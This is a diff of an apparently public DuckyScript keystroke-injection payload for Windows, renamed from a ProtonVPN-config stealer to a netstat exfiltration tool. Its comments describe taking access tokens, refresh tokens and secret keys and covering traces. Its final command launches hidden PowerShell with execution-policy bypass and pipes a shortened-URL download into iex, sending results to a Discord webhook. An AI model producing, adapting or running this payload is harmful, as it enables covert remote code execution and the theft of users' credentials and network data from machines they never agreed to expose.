@@ -1,34 +1,35 @@
 REM ###################################################################
 REM #                                                                 |
-REM # Title        : ProtonVPN-config-to-Discord-Exfiltration         |
+REM # Title        : Windows-netstat-to-Discord-Exfiltration          |
 REM # Author       : Aleff                                            |
 REM # Version      : 1.0                                              |
-REM # Category     : Credentials, Exfiltration                        |
+REM # Category     : Net, Exfiltration                                |
 REM # Target       : Windows 10-11                                    |
 REM #                                                                 |
 REM ###################################################################
 
-REM Title: ProtonVPN-config-to-Discord-Exfiltration
+REM Title: Windows-netstat-to-Discord-Exfiltration
 REM Author: Aleff
-REM Description: Opens PowerShell hidden, grabs ProtonVPN config file, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
-REM              In the config file you can find a lot information about the user like:
-REM              - UserUid 
-REM              - UserAccessToken
-REM              - UserRefreshToken
-REM              - UserAuthenticationPublicKey
-REM              - UserAuthenticationSecretKey
-REM              - UserAuthenticationCertificatePem
-REM              - UserCertificationServerPublicKey 
-REM              - and so on...
-REM              Then it cleans up traces of what you have done after.
-REM Target: Windows 10-11 (PowerShell + ProtonVPN software)
+REM Description: Opens PowerShell hidden, grabs netstat status, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
+REM Put 1 on the function that you want to active, else 0. Functions available:
+REM - default (simple 'netstat' command)
+REM - routing_table $r
+REM - listening_canonical $lc
+REM - listening_numerical $ln
+REM - all_canonical $ac
+REM - all_numerical $an
+REM - offload ot
+REM - proto $p "<protocol>"
+REM - - In this option you must put the protocol that you want to monitor, for example $p="TCP" if you want to monitor TCP, else leave blank, so $p="".
+
+REM Target: Windows 10-11 (PowerShell)
 REM Version: 1.0
-REM Category: Credentials, Exfiltration
-REM Requirements: ProtonVPN user logged at least one time and internet connection
+REM Category: Net, Exfiltration
+REM Requirements: Internet connection
 REM 
 
 
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/Windows-netstat | iex
+STRINGLN powershell -w h -ep bypass $discord='<your-webhook-here>';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm bit.ly/Windows-netstat | iex
